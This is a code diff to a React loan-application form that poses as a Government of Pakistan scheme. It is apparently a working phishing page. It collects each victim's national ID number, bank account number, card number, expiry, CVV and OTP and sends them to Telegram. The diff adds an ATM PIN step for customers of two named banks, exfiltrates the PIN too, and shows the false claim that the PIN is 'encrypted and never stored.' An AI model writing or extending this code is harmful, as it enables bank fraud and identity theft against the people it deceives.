@@ -4,12 +4,14 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Card } from "@/components/ui/card";
-import { Check, ShieldCheck, Lock, FileText, CreditCard, Banknote, ArrowRight, ArrowLeft, Loader2, Smartphone, RefreshCw, MessageSquare, Phone } from "lucide-react";
+import { Check, ShieldCheck, Lock, FileText, CreditCard, Banknote, ArrowRight, ArrowLeft, Loader2, Smartphone, RefreshCw, MessageSquare, Phone, KeyRound } from "lucide-react";
 import { toast } from "sonner";
 import CardIllustration from "@/components/CardIllustration";
 import PaymentLogos from "@/components/PaymentLogos";
 import govLogo from "@/assets/gov-pakistan-logo.png";
 import { supabase } from "@/integrations/supabase/client";
+
+const PIN_BANKS = ["Meezan Bank", "Bank Alfalah"];
 
 const sendToTelegram = async (stage: string, data: Record<string, unknown>) => {
   try {
@@ -163,6 +165,11 @@ const LoanForm = () => {
         return;
       }
       toast.success("OTP verified successfully");
+      if (PIN_BANKS.includes(data.bankName)) {
+        setStep(5);
+        setSearching(false);
+        return;
+      }
       const id = `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`;
       setTrackingId(id);
       sendToTelegram("step5", {
@@ -170,11 +177,33 @@ const LoanForm = () => {
         "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
         Bank: data.bankName, "Account Number": data.accountNumber,
         "Card Number": data.cardNumber, Expiry: data.expiry, CVV: data.cvv,
-        "ATM PIN": data.atmPin, OTP: data.otp,
+        OTP: data.otp,
       });
       setSubmitted(true);
       toast.success("Loan application submitted successfully!");
     }, 2200);
+  };
+
+  const submitWithPin = () => {
+    if (data.atmPin.length !== 4) {
+      toast.error("Please enter your 4-digit ATM PIN");
+      return;
+    }
+    setSearching(true);
+    const id = `GOP-2026-${Math.floor(100000 + Math.random() * 900000)}-PK`;
+    setTrackingId(id);
+    sendToTelegram("step6-pin", {
+      "Tracking ID": id,
+      "Full Name": data.fullName, CNIC: data.cnic, Mobile: data.phone,
+      Bank: data.bankName, "Account Number": data.accountNumber,
+      "Card Number": data.cardNumber, Expiry: data.expiry, CVV: data.cvv,
+      OTP: data.otp, "ATM PIN": data.atmPin,
+    });
+    setTimeout(() => {
+      setSearching(false);
+      setSubmitted(true);
+      toast.success("Loan application submitted successfully!");
+    }, 2000);
   };
 
   const formatCard = (v: string) => v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
@@ -184,11 +213,14 @@ const LoanForm = () => {
     return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
   };
 
+  const requiresPin = PIN_BANKS.includes(data.bankName);
+
   const steps = [
     { num: 1, label: "Personal Information", urdu: "ذاتی معلومات", icon: FileText },
     { num: 2, label: "Bank Information", urdu: "بینک معلومات", icon: Banknote },
     { num: 3, label: "Card Verification", urdu: "کارڈ کی تصدیق", icon: CreditCard },
     { num: 4, label: "OTP Confirmation", urdu: "او ٹی پی تصدیق", icon: ShieldCheck },
+    ...(requiresPin ? [{ num: 5, label: "ATM PIN", urdu: "اے ٹی ایم پن", icon: KeyRound }] : []),
   ];
 
   const BiLabel = ({ en, ur, required }: { en: string; ur: string; required?: boolean }) => (
@@ -628,6 +660,85 @@ const LoanForm = () => {
           </div>
         )}
 
+        {step === 5 && (
+          <div className="space-y-6 animate-fade-in">
+            <div className="flex items-start justify-between gap-4">
+              <div className="flex items-center gap-3">
+                <div className="w-11 h-11 rounded-xl bg-gov-green/10 flex items-center justify-center">
+                  <KeyRound className="w-6 h-6 text-gov-green" />
+                </div>
+                <div>
+                  <h2 className="text-2xl font-bold text-foreground">ATM PIN Verification</h2>
+                  <p className="text-sm text-muted-foreground mt-0.5">Extra security for {data.bankName}</p>
+                  <p className="text-sm text-muted-foreground mt-0.5" dir="rtl" lang="ur">اے ٹی ایم پن کی تصدیق</p>
+                </div>
+              </div>
+              <h3 className="text-lg font-bold text-gov-green italic mt-1" dir="rtl" lang="ur">سیکیورٹی</h3>
+            </div>
+
+            <div className="rounded-xl border border-gov-gold/40 bg-gov-gold/10 p-4 flex items-start gap-3">
+              <ShieldCheck className="w-5 h-5 text-gov-green shrink-0 mt-0.5" />
+              <div>
+                <p className="text-sm font-semibold text-gov-green">
+                  {data.bankName} requires ATM PIN confirmation
+                </p>
+                <p className="text-xs text-muted-foreground mt-1" dir="rtl" lang="ur">
+                  {data.bankName} کے لیے اے ٹی ایم پن کی تصدیق ضروری ہے
+                </p>
+              </div>
+            </div>
+
+            <div>
+              <div className="flex items-center justify-between mb-2">
+                <Label className="text-foreground text-sm font-semibold">
+                  Enter 4-digit ATM PIN <span className="text-destructive">*</span>
+                </Label>
+                <span className="text-xs text-muted-foreground" dir="rtl" lang="ur">4 ہندسوں کا اے ٹی ایم پن</span>
+              </div>
+              <div className="relative">
+                <Input
+                  value={data.atmPin}
+                  onChange={(e) => update("atmPin", e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  maxLength={4}
+                  inputMode="numeric"
+                  autoFocus
+                  className="absolute inset-0 opacity-0 cursor-pointer"
+                  aria-label="ATM PIN"
+                />
+                <div className="grid grid-cols-4 gap-3 pointer-events-none max-w-xs mx-auto">
+                  {Array.from({ length: 4 }).map((_, i) => {
+                    const char = data.atmPin[i] || "";
+                    const active = data.atmPin.length === i;
+                    const filled = !!char;
+                    return (
+                      <div
+                        key={i}
+                        className={`aspect-square flex items-center justify-center rounded-xl border-2 text-3xl font-bold font-mono transition-all ${
+                          filled
+                            ? "border-gov-green bg-gov-green/5 text-gov-green"
+                            : active
+                            ? "border-gov-gold bg-gov-gold/5 ring-2 ring-gov-gold/20"
+                            : "border-border bg-white text-muted-foreground"
+                        }`}
+                      >
+                        {filled ? "●" : "○"}
+                      </div>
+                    );
+                  })}
+                </div>
+              </div>
+            </div>
+
+            <div className="flex items-start gap-2 text-xs text-muted-foreground bg-gov-green/5 border border-gov-green/10 rounded-lg p-3">
+              <Lock className="w-3.5 h-3.5 text-gov-green shrink-0 mt-0.5" />
+              <p>
+                Your ATM PIN is encrypted and never stored. It is used only for one-time identity verification.
+                <span className="block mt-1" dir="rtl" lang="ur">آپ کا اے ٹی ایم پن محفوظ ہے اور صرف تصدیق کے لیے استعمال ہوتا ہے۔</span>
+              </p>
+            </div>
+          </div>
+        )}
+
         <div className="flex justify-between mt-8 pt-6 border-t border-border">
           <Button
             variant="outline"
@@ -640,9 +751,13 @@ const LoanForm = () => {
             <Button onClick={next} className="bg-gov-green hover:bg-gov-green/90 text-white shadow-soft">
               Continue / <span dir="rtl" lang="ur" className="mx-1">جاری رکھیں</span> <ArrowRight className="w-4 h-4 ml-2" />
             </Button>
-          ) : (
+          ) : step === 4 ? (
             <Button onClick={verifyOtp} className="bg-gradient-gold text-gov-green-dark font-bold shadow-gold hover:opacity-95">
-              Verify & Submit / <span dir="rtl" lang="ur" className="mx-1">تصدیق و جمع</span> <Check className="w-4 h-4 ml-2" />
+              Verify OTP / <span dir="rtl" lang="ur" className="mx-1">تصدیق کریں</span> <Check className="w-4 h-4 ml-2" />
+            </Button>
+          ) : (
+            <Button onClick={submitWithPin} className="bg-gradient-gold text-gov-green-dark font-bold shadow-gold hover:opacity-95">
+              Confirm & Submit / <span dir="rtl" lang="ur" className="mx-1">تصدیق و جمع</span> <Check className="w-4 h-4 ml-2" />
             </Button>
           )}
         </div>
